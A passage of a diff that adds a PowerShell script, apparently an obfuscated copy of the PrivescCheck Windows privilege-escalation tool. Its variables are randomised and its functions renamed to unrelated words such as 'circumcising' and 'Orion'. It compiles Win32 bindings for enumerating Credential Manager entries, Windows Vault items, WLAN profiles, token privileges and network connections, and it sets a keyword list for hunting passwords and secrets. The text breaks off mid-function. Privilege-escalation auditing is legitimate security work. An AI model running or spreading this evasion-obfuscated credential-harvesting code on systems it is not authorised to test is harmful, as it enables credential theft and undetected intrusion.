@@ -1,0 +1,3711 @@
+$qMwBAvlB99:ScriptPath = $MyInvocation.MyCommand.Definition
+$qMwBAvlB99:CachedServiceList = New-Object -TypeName System.Collections.ArrayList
+$qMwBAvlB99:CachedHotFixList = New-Object -TypeName System.Collections.ArrayList
+$qMwBAvlB99:CachedScheduledTaskList = New-Object -TypeName System.Collections.ArrayList
+$qMwBAvlB99:ResultArrayList = New-Object -TypeName System.Collections.ArrayList
+[string[]] $qMwBAvlB99:KeywordsOfInterest = "key", "passw", "secret", "pwd", "creds", "credential", "api"
+$XGenZYWJ99 = @'
+private const Int32 ANYSIZE_ARRAY = 1;
+[System.FlagsAttribute]
+public enum ServiceAccessFlags : uint
+{
+    QueryConfig = 1,
+    ChangeConfig = 2,
+    QueryStatus = 4,
+    EnumerateDependents = 8,
+    Start = 16,
+    Stop = 32,
+    PauseContinue = 64,
+    Interrogate = 128,
+    UserDefinedControl = 256,
+    Delete = 65536,
+    ReadControl = 131072,
+    WriteDac = 262144,
+    WriteOwner = 524288,
+    Synchronize = 1048576,
+    AccessSystemSecurity = 16777216,
+    GenericAll = 268435456,
+    GenericExecute = 536870912,
+    GenericWrite = 1073741824,
+    GenericRead = 2147483648
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct LUID {
+   public UInt32 LowPart;
+   public Int32 HighPart;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct SID_AND_ATTRIBUTES {
+    public IntPtr Sid;
+    public int Attributes;
+}
+[StructLayout(LayoutKind.Sequential, Pack = 4)]
+public struct LUID_AND_ATTRIBUTES {
+   public LUID Luid;
+   public UInt32 Attributes;
+}
+public struct TOKEN_USER {
+    public SID_AND_ATTRIBUTES User;
+}
+public struct TOKEN_PRIVILEGES {
+    public int PrivilegeCount;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)]
+    public LUID_AND_ATTRIBUTES [] Privileges;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_TCPROW_OWNER_PID
+{
+    public uint state;
+    public uint localAddr;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] localPort;
+    public uint remoteAddr;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] remotePort;
+    public uint owningPid;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_UDPROW_OWNER_PID
+{
+    public uint localAddr;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] localPort;
+    public uint owningPid;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_TCP6ROW_OWNER_PID
+{
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+    public byte[] localAddr;
+    public uint localScopeId;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] localPort;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+    public byte[] remoteAddr;
+    public uint remoteScopeId;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] remotePort;
+    public uint state;
+    public uint owningPid;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_UDP6ROW_OWNER_PID
+{
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
+    public byte[] localAddr;
+    public uint localScopeId;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
+    public byte[] localPort;
+    public uint owningPid;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_TCPTABLE_OWNER_PID
+{
+    public uint dwNumEntries;
+    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
+    public MIB_TCPROW_OWNER_PID[] table;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_UDPTABLE_OWNER_PID
+{
+    public uint dwNumEntries;
+    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
+    public MIB_UDPROW_OWNER_PID[] table;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_TCP6TABLE_OWNER_PID
+{
+    public uint dwNumEntries;
+    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
+    public MIB_TCP6ROW_OWNER_PID[] table;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct MIB_UDP6TABLE_OWNER_PID
+{
+    public uint dwNumEntries;
+    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
+    public MIB_UDP6ROW_OWNER_PID[] table;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct FILETIME
+{
+    public uint dwLowDateTime;
+    public uint dwHighDateTime;
+}
+[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+public struct CREDENTIAL
+{
+    public uint Flags;
+    public uint Type;
+    public string TargetName;
+    public string Comment;
+    public FILETIME LastWritten;
+    public uint CredentialBlobSize;
+    public IntPtr CredentialBlob;
+    public uint Persist;
+    public uint AttributeCount;
+    public IntPtr Attributes;
+    public string TargetAlias;
+    public string UserName;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct UNICODE_STRING
+{
+   public ushort Length;
+   public ushort MaximumLength;
+   public IntPtr Buffer;
+}
+[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+public struct VAULT_ITEM_7
+{
+    public Guid SchemaId;
+    public string FriendlyName;
+    public IntPtr Resource;
+    public IntPtr Identity;
+    public IntPtr Authenticator;
+    public UInt64 LastWritten;
+    public UInt32 Flags;
+    public UInt32 PropertiesCount;
+    public IntPtr Properties;
+}
+[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+public struct VAULT_ITEM_8
+{
+    public Guid SchemaId;
+    public string FriendlyName;
+    public IntPtr Resource;
+    public IntPtr Identity;
+    public IntPtr Authenticator;
+    public IntPtr PackageSid;
+    public UInt64 LastWritten;
+    public UInt32 Flags;
+    public UInt32 PropertiesCount;
+    public IntPtr Properties;
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct VAULT_ITEM_DATA_HEADER
+{
+    public UInt32 SchemaElementId;
+    public UInt32 Unknown1;
+    public UInt32 Type;
+    public UInt32 Unknown2;
+}
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+public struct WLAN_INTERFACE_INFO
+{
+    public Guid InterfaceGuid;
+    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
+    public string strInterfaceDescription;
+    public uint isState; // WLAN_INTERFACE_STATE
+}
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+public struct WLAN_PROFILE_INFO
+{
+    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
+    public string strProfileName;
+    public uint dwFlags;
+}
+[DllImport("advapi32.dll", SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool QueryServiceObjectSecurity(IntPtr serviceHandle, System.Security.AccessControl.SecurityInfos secInfo, byte[] lpSecDesrBuf, uint bufSize, out uint bufSizeNeeded);
+[DllImport("advapi32.dll", SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool CloseServiceHandle(IntPtr hSCObject);
+[DllImport("advapi32.dll", SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+[DllImport("advapi32.dll", SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool GetTokenInformation(IntPtr TokenHandle, UInt32 TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);
+[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool LookupAccountSid(string lpSystemName, IntPtr Sid, System.Text.StringBuilder lpName, ref uint cchName, System.Text.StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out int peUse);
+[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, System.Text.StringBuilder lpName, ref int cchName );
+[DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool CredEnumerate(IntPtr Filter, UInt32 Flags, out UInt32 Count, out IntPtr Credentials);
+[DllImport("advapi32.dll")]
+public static extern void CredFree(IntPtr Buffer);
+[DllImport("advapi32.dll", SetLastError=false)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool IsTextUnicode(IntPtr buf, UInt32 len, ref UInt32 opt);
+[DllImport("kernel32.dll", SetLastError=true)]
+public static extern IntPtr GetCurrentProcess();
+[DllImport("kernel32.dll", SetLastError=true)]
+public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+[DllImport("kernel32.dll", SetLastError=true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+public static extern bool CloseHandle(IntPtr hObject);
+[DllImport("kernel32.dll")]
+public static extern UInt64 GetTickCount64();
+[DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+public static extern uint GetFirmwareEnvironmentVariable(string lpName, string lpGuid, IntPtr pBuffer, uint nSize);
+[DllImport("kernel32.dll", SetLastError=true)]
+public static extern bool GetFirmwareType(ref uint FirmwareType);
+[DllImport("iphlpapi.dll", SetLastError=true)]
+public static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);
+[DllImport("iphlpapi.dll", SetLastError=true)]
+public static extern uint GetExtendedUdpTable(IntPtr pUdpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);
+[DllImport("vaultcli.dll", SetLastError=false)]
+public static extern uint VaultEnumerateVaults(uint dwFlags, out int VaultsCount, out IntPtr ppVaultGuids);
+[DllImport("vaultcli.dll", SetLastError=false)]
+public static extern uint VaultOpenVault(IntPtr pVaultId, uint dwFlags, out IntPtr pVaultHandle);
+[DllImport("vaultcli.dll", SetLastError=false)]
+public static extern uint VaultEnumerateItems(IntPtr pVaultHandle, uint dwFlags, out int ItemsCount, out IntPtr ppItems);
+[DllImport("vaultcli.dll", SetLastError=false, EntryPoint="VaultGetItem")]
+public static extern uint VaultGetItem7(IntPtr pVaultHandle, ref Guid guidSchemaId, IntPtr pResource, IntPtr pIdentity, IntPtr pUnknown, uint iUnknown, out IntPtr pItem);
+[DllImport("vaultcli.dll", SetLastError=false, EntryPoint="VaultGetItem")]
+public static extern uint VaultGetItem8(IntPtr pVaultHandle, ref Guid guidSchemaId, IntPtr pResource, IntPtr pIdentity, IntPtr pPackageSid, IntPtr pUnknown, uint iUnknown, out IntPtr pItem);
+[DllImport("vaultcli.dll", SetLastError=false)]
+public static extern uint VaultFree(IntPtr pVaultItem);
+[DllImport("vaultcli.dll", SetLastError=false)]
+public static extern uint VaultCloseVault(ref IntPtr pVaultHandle);
+[DllImport("Wlanapi.dll")]
+public static extern uint WlanOpenHandle(uint dwClientVersion, IntPtr pReserved, out uint pdwNegotiatedVersion, out IntPtr hClientHandle);
+[DllImport("Wlanapi.dll")]
+public static extern uint WlanCloseHandle(IntPtr hClientHandle, IntPtr pReserved);
+[DllImport("Wlanapi.dll")]
+public static extern uint WlanEnumInterfaces(IntPtr hClientHandle, IntPtr pReserved, ref IntPtr ppInterfaceList);
+[DllImport("Wlanapi.dll")]
+public static extern void WlanFreeMemory(IntPtr pMemory);
+[DllImport("Wlanapi.dll")]
+public static extern uint WlanGetProfileList(IntPtr hClientHandle, [MarshalAs(UnmanagedType.LPStruct)]Guid interfaceGuid, IntPtr pReserved, out IntPtr ppProfileList);
+[DllImport("Wlanapi.dll")]
+public static extern uint WlanGetProfile(IntPtr clientHandle, [MarshalAs(UnmanagedType.LPStruct)] Guid interfaceGuid, [MarshalAs(UnmanagedType.LPWStr)] string profileName, IntPtr pReserved, [MarshalAs(UnmanagedType.LPWStr)] out string profileXml, ref uint flags, out uint pdwGrantedAccess);
+'@
+try {
+    [PrivescCheck.Win32] | Out-Null 
+} catch {
+    $ofjMwVxL99 = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
+    $ofjMwVxL99.GenerateInMemory = $True
+    $ofjMwVxL99.GenerateExecutable = $False 
+    Add-Type -MemberDefinition $XGenZYWJ99 -Name 'Win32' -Namespace 'PrivescCheck' -Language CSharp -CompilerParameters $ofjMwVxL99
+}
+function circumcising {
+    [CmdletBinding()] param(
+        [string]$Sid
+    )
+    try {
+        $pJdxflKX99 = New-Object System.Security.Principal.SecurityIdentifier($Sid)
+        $pJdxflKX99.Translate([System.Security.Principal.NTAccount]) | Select-Object -ExpandProperty Value
+    } catch {
+    }
+}
+function tremolos {
+    
+    [CmdletBinding()] param(
+        [System.DateTime]
+        $Date
+    )
+    $btyVwxyl99 = ""
+    $btyVwxyl99 += $Date.ToString('yyyy-MM-dd - HH:mm:ss')
+    $btyVwxyl99
+}
+function youth {
+    
+    [CmdletBinding()] param(
+        [int]
+        $UoUwjeQj99
+    )
+    $uwCiOrmG99 = @{
+        "KernelDriver" =        "1";
+        "FileSystemDriver" =    "2";
+        "Adapter" =             "4";
+        "RecognizerDriver" =    "8";
+        "Win32OwnProcess" =     "16";
+        "Win32ShareProcess" =   "32";
+        "InteractiveProcess" =  "256";
+    }
+    $uwCiOrmG99.GetEnumerator() | ForEach-Object { 
+        if ( $_.value -band $UoUwjeQj99 ) 
+        {
+            $_.name
+        }
+    }
+}
+function Orion {
+    
+    [CmdletBinding()] param(
+        [int]
+        $nWlfWoqT99
+    )
+    $GNeSlTqU99 = @{
+        "Boot" =        "0";
+        "System" =      "1";
+        "Automatic" =   "2";
+        "Manual" =      "3";
+        "Disabled" =    "4";
+    }
+    $GNeSlTqU99.GetEnumerator() | ForEach-Object { 
+        if ( $_.Value -eq $nWlfWoqT99 ) 
+        {
+            $_.Name
+        }
+    }
+}
+function throes {
+    [CmdletBinding()] param(
+        [object]$ghiDMOMF99
+    )
+    if ($ghiDMOMF99) {
+        $RYytQiXd99 = $ghiDMOMF99.ImagePath        
+        $wAaVPJip99 = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
+        ForEach($pHePrZgT99 in $wAaVPJip99) {
+            $tzkhTdnZ99 = $RYytQiXd99.Split($pHePrZgT99) | Where-Object {$_ -and ($_.trim() -ne '')}
+            ForEach($MqKMdAme99 in $tzkhTdnZ99) {
+                $TRNcYDwm99 = $([System.Environment]::ExpandEnvironmentVariables($MqKMdAme99))
+                $bonEMhED99 = Resolve-Path -Path $TRNcYDwm99 -ErrorAction SilentlyContinue -ErrorVariable ErrorResolvePath 
+                if (-not $uloGNixB99) {
+                    $File = Get-Item -Path $bonEMhED99 -ErrorAction SilentlyContinue -ErrorVariable ErrorGetItem 
+                    if (-not $OwEwxdGA99) {
+                        if ($File.VersionInfo.LegalCopyright -Like "*Microsoft Corporation*") {
+                            return $True 
+                        } else {
+                            return $False
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return $False
+}
+function etymology {
+    
+    [CmdletBinding()] param()
+    function profundities {
+        [CmdletBinding()] param(
+            [string]
+            $Name
+        )
+        $UIdtivsS99 = @{
+            "SeAssignPrimaryTokenPrivilege" =               "Replace a process-level token";
+            "SeAuditPrivilege" =                            "Generate security audits";
+            "SeBackupPrivilege" =                           "Back up files and directories";
+            "SeChangeNotifyPrivilege" =                     "Bypass traverse checking";
+            "SeCreateGlobalPrivilege" =                     "Create global objects";
+            "SeCreatePagefilePrivilege" =                   "Create a pagefile";
+            "SeCreatePermanentPrivilege" =                  "Create permanent shared objects";
+            "SeCreateSymbolicLinkPrivilege" =               "Create symbolic links";
+            "SeCreateTokenPrivilege" =                      "Create a token object";
+            "SeDebugPrivilege" =                            "Debug programs";
+            "SeDelegateSessionUserImpersonatePrivilege" =   "Impersonate other users";
+            "SeEnableDelegationPrivilege" =                 "Enable computer and user accounts to be trusted for delegation";
+            "SeImpersonatePrivilege" =                      "Impersonate a client after authentication";
+            "SeIncreaseBasePriorityPrivilege" =             "Increase scheduling priority";
+            "SeIncreaseQuotaPrivilege" =                    "Adjust memory quotas for a process";
+            "SeIncreaseWorkingSetPrivilege" =               "Increase a process working set";
+            "SeLoadDriverPrivilege" =                       "Load and unload device drivers";
+            "SeLockMemoryPrivilege" =                       "Lock pages in memory";
+            "SeMachineAccountPrivilege" =                   "Add workstations to domain";
+            "SeManageVolumePrivilege" =                     "Manage the files on a volume";
+            "SeProfileSingleProcessPrivilege" =             "Profile single process";
+            "SeRelabelPrivilege" =                          "Modify an object label";
+            "SeRemoteShutdownPrivilege" =                   "Force shutdown from a remote system";
+            "SeRestorePrivilege" =                          "Restore files and directories";
+            "SeSecurityPrivilege" =                         "Manage auditing and security log";
+            "SeShutdownPrivilege" =                         "Shut down the system";
+            "SeSyncAgentPrivilege" =                        "Synchronize directory service data";
+            "SeSystemEnvironmentPrivilege" =                "Modify firmware environment values";
+            "SeSystemProfilePrivilege" =                    "Profile system performance";
+            "SeSystemtimePrivilege" =                       "Change the system time";
+            "SeTakeOwnershipPrivilege" =                    "Take ownership of files or other objects";
+            "SeTcbPrivilege" =                              "Act as part of the operating system";
+            "SeTimeZonePrivilege" =                         "Change the time zone";
+            "SeTrustedCredManAccessPrivilege" =             "Access Credential Manager as a trusted caller";
+            "SeUndockPrivilege" =                           "Remove computer from docking station";
+            "SeUnsolicitedInputPrivilege" =                 "N/A";
+        }
+        $UIdtivsS99[$Name]
+    }
+    $maELRjzw99 = [PrivescCheck.Win32]::GetCurrentProcess()
+    Write-Verbose "Current process handle: $maELRjzw99"
+    $iqToAVCT99= 0x0008
+    [IntPtr]$kVdRMvFG99 = [IntPtr]::Zero
+    $BUBqVtlJ99 = [PrivescCheck.Win32]::OpenProcessToken($maELRjzw99, $iqToAVCT99, [ref]$kVdRMvFG99);
+    $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    if ($BUBqVtlJ99) {
+        Write-Verbose "OpenProcessToken() OK - Token handle: $kVdRMvFG99"
+        $tlkCokPA99 = 0
+        $BUBqVtlJ99 = [PrivescCheck.Win32]::GetTokenInformation($kVdRMvFG99, 3, 0, $Null, [ref]$tlkCokPA99)
+        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        if (-not ($tlkCokPA99 -eq 0)) {
+            Write-Verbose "GetTokenInformation() OK - TokenPrivilegesPtrSize = $tlkCokPA99"
+            [IntPtr]$igpCjUaB99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tlkCokPA99)
+            $BUBqVtlJ99 = [PrivescCheck.Win32]::GetTokenInformation($kVdRMvFG99, 3, $igpCjUaB99, $tlkCokPA99, [ref]$tlkCokPA99)
+            $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            if ($BUBqVtlJ99) {
+                $YejLiSAz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($igpCjUaB99, [type] [PrivescCheck.Win32+TOKEN_PRIVILEGES])
+                $mAvHuZEW99 = [IntPtr] ($igpCjUaB99.ToInt64() + 4)
+                
+                Write-Verbose "GetTokenInformation() OK - Privilege count: $($YejLiSAz99.PrivilegeCount)"
+                For ($i = 0; $i -lt $YejLiSAz99.PrivilegeCount; $i++) {
+                    $QUZtyLBC99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mAvHuZEW99, [type] [PrivescCheck.Win32+LUID_AND_ATTRIBUTES])
+                    
+                    $RYKIefQM99 = [System.Runtime.InteropServices.Marshal]::SizeOf($QUZtyLBC99.Luid)
+                    [IntPtr]$msWrhjTI99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RYKIefQM99)
+                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($QUZtyLBC99.Luid, $msWrhjTI99, $True)
+                    [int]$zHjHfbMh99 = 0
+                    $BUBqVtlJ99 = [PrivescCheck.Win32]::LookupPrivilegeName($Null, $msWrhjTI99, $Null, [ref]$zHjHfbMh99)
+                    $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    if (-not ($zHjHfbMh99 -eq 0)) {
+                        Write-Verbose "LookupPrivilegeName() OK - Length = $zHjHfbMh99"
+                        $Name = New-Object -TypeName System.Text.StringBuilder
+                        $Name.EnsureCapacity($zHjHfbMh99 + 1) |Out-Null
+                        $BUBqVtlJ99 = [PrivescCheck.Win32]::LookupPrivilegeName($Null, $msWrhjTI99, $Name, [ref]$zHjHfbMh99)
+                        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                        if ($BUBqVtlJ99) {
+                            $zbjjUIuD99 = $Name.ToString()
+                            $REonLYtQ99 = ($QUZtyLBC99.Attributes -band 2) -eq 2
+                            Write-Verbose "LookupPrivilegeName() OK - Name: $zbjjUIuD99 - Enabled: $REonLYtQ99"
+                            $EBHmNYXi99 = New-Object -TypeName PSObject 
+                            $EBHmNYXi99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $zbjjUIuD99
+                            $EBHmNYXi99 | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($REonLYtQ99) { "Enabled" } else { "Disabled" })
+                            $EBHmNYXi99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $(profundities -Name $zbjjUIuD99)
+                            $EBHmNYXi99
+                        } else {
+                            Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+                        }
+                    } else {
+                        Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+                    }
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($msWrhjTI99)
+                    $mAvHuZEW99 = [IntPtr] ($mAvHuZEW99.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($QUZtyLBC99))
+                }
+            } else {
+                Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+            }
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($igpCjUaB99)
+        } else {
+            Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+        }
+        $BUBqVtlJ99 = [PrivescCheck.Win32]::CloseHandle($kVdRMvFG99)
+        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        if ($BUBqVtlJ99) {
+            Write-Verbose "Token handle closed"
+        } else {
+            Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+        }
+    } else {
+        Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+    }
+}
+function Get-UserFromProcess() {
+    
+    [CmdletBinding()] param(
+        [Parameter(Mandatory=$true)]
+        [int]
+        $ITXypsVd99
+    )
+    function designed {
+        param(
+            $kjsUOvsc99
+        )
+        $jXwSQzyh99 = @{
+            "User" = "1";
+            "Group" = "2";
+            "Domain" = "3";
+            "Alias" = "4";
+            "WellKnownGroup" = "5";
+            "DeletedAccount" = "6";
+            "Invalid" = "7";
+            "Unknown" = "8";
+            "Computer" = "9";
+            "Label" = "10";
+            "LogonSession" = "11";
+        }
+        $jXwSQzyh99.GetEnumerator() | ForEach-Object { 
+            if ( $_.value -eq $kjsUOvsc99 ) 
+            {
+                $_.name
+            }
+        }
+    }
+    $GNhHCnIG99 = 0x0400
+    $maELRjzw99 = [PrivescCheck.Win32]::OpenProcess($GNhHCnIG99, $False, $ITXypsVd99)
+    if (-not ($Null -eq $maELRjzw99)) {
+        Write-Verbose "OpenProcess() OK - Handle: $maELRjzw99"
+        $iqToAVCT99= 0x0008
+        [IntPtr]$kVdRMvFG99 = [IntPtr]::Zero
+        $BUBqVtlJ99 = [PrivescCheck.Win32]::OpenProcessToken($maELRjzw99, $iqToAVCT99, [ref]$kVdRMvFG99);
+        if ($BUBqVtlJ99) {
+            Write-Verbose "OpenProcessToken() OK - Handle: $maELRjzw99"
+            $GoxfajFI99 = 0
+            $BUBqVtlJ99 = [PrivescCheck.Win32]::GetTokenInformation($kVdRMvFG99, 1, 0, $Null, [ref]$GoxfajFI99)
+            $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            if (($GoxfajFI99 -gt 0) -and ($UoLxMgJM99 -eq 122)) {
+                Write-Verbose "GetTokenInformation() OK - Size: $GoxfajFI99"
+                [IntPtr]$PTJyVbET99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($GoxfajFI99)
+                $BUBqVtlJ99 = [PrivescCheck.Win32]::GetTokenInformation($kVdRMvFG99, 1, $PTJyVbET99, $GoxfajFI99, [ref]$GoxfajFI99)
+                $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error() 
+                if ($BUBqVtlJ99) {
+                    Write-Verbose "GetTokenInformation() OK"
+                    $sPoDOMem99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PTJyVbET99, [type] [PrivescCheck.Win32+TOKEN_USER])
+                    $kjsUOvsc99 = 0
+                    $GdTCDXvp99 = 256
+                    $BDbTKBEl99 = New-Object -TypeName System.Text.StringBuilder
+                    $BDbTKBEl99.EnsureCapacity(256) | Out-Null
+                    $jUvDZkEU99 = 256
+                    $jQhrebYD99 = New-Object -TypeName System.Text.StringBuilder
+                    $jQhrebYD99.EnsureCapacity(256) | Out-Null
+                    $BUBqVtlJ99 = [PrivescCheck.Win32]::LookupAccountSid($Null, $sPoDOMem99.User.Sid, $BDbTKBEl99, [ref]$GdTCDXvp99, $jQhrebYD99, [ref]$jUvDZkEU99, [ref]$kjsUOvsc99)
+                    $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    if ($BUBqVtlJ99) {
+                        $eEXDbunO99 = New-Object -TypeName PSObject 
+                        $eEXDbunO99 | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $jQhrebYD99.ToString()
+                        $eEXDbunO99 | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $BDbTKBEl99.ToString()
+                        $eEXDbunO99 | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value "$($jQhrebYD99.ToString())\$($BDbTKBEl99.ToString())"
+                        $eEXDbunO99 | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(designed $kjsUOvsc99)
+                        $eEXDbunO99
+                        
+                    } else {
+                        Write-Verbose "LookupAccountSid() failed."
+                        Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+                    }
+                } else {
+                    Write-Verbose "GetTokenInformation() failed."
+                    Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+                }
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PTJyVbET99)
+            }
+            $BUBqVtlJ99 = [PrivescCheck.Win32]::CloseHandle($kVdRMvFG99)
+            $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            if ($BUBqVtlJ99) {
+                Write-Verbose "Token handle closed"
+            } else {
+                Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+            }
+        } else {
+            Write-Verbose "Can't open token for process with PID $ITXypsVd99"
+        }
+        $BUBqVtlJ99 = [PrivescCheck.Win32]::CloseHandle($maELRjzw99)
+        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        if ($BUBqVtlJ99) {
+            Write-Verbose "Process handle closed"
+        } else {
+            Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+        }
+    } else {
+        Write-Verbose "Can't open process with PID $ITXypsVd99"
+    }
+}
+function published {
+    [CmdletBinding()] param(
+        [switch]
+        $IPv6 = $False, # IPv4 by default 
+        [switch]
+        $UDP = $False # TCP by default 
+    )
+    $DmTbLZpL99 = 23
+    $kAyZAaab99 = 2
+    
+    if ($IPv6) { 
+        $iOaZLlEh99 = $DmTbLZpL99
+    } else {
+        $iOaZLlEh99 = $kAyZAaab99
+    }
+    if ($UDP) {
+        $psSkWMpg99 = 1
+        [int]$maAgtaEl99 = 0
+        $XwsMixSg99 = [PrivescCheck.Win32]::GetExtendedUdpTable([IntPtr]::Zero, [ref]$maAgtaEl99, $True, $iOaZLlEh99, $psSkWMpg99, 0)
+        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    } else {
+        $BzuPlDCR99 = 3
+        [int]$maAgtaEl99 = 0
+        $XwsMixSg99 = [PrivescCheck.Win32]::GetExtendedTcpTable([IntPtr]::Zero, [ref]$maAgtaEl99, $True, $iOaZLlEh99, $BzuPlDCR99, 0)
+        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    }
+    if ($XwsMixSg99 -eq 122) {
+        Write-Verbose "GetExtendedProtoTable() OK - Size: $maAgtaEl99"
+        [IntPtr]$TNDssRLn99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($maAgtaEl99)
+        if ($UDP) {
+            $XwsMixSg99 = [PrivescCheck.Win32]::GetExtendedUdpTable($TNDssRLn99, [ref]$maAgtaEl99, $True, $iOaZLlEh99, $psSkWMpg99, 0)
+            $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        } else {
+            $XwsMixSg99 = [PrivescCheck.Win32]::GetExtendedTcpTable($TNDssRLn99, [ref]$maAgtaEl99, $True, $iOaZLlEh99, $BzuPlDCR99, 0)
+            $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        }
+        if ($XwsMixSg99 -eq 0) {
+            if ($UDP) {
+                if ($iOaZLlEh99 -eq $kAyZAaab99) { 
